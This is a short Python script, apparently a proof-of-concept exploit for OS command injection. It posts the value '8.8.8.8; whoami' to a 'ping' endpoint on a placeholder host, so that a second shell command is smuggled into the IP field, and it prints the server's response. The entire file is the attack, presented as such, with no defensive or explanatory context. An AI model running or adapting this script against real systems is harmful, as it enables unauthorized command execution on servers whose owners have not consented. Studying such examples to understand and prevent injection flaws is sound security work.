import requests

def exploit():
    url = "http://vulnerable-host.com/ping"
    payload = "8.8.8.8; whoami"  # Injects a shell command
    data = {"ip": payload}

    print("[*] Sending malicious request...")
    response = requests.post(url, data=data)
    print("[+] Response:")
    print(response.text)

if __name__ == "__main__":
    exploit()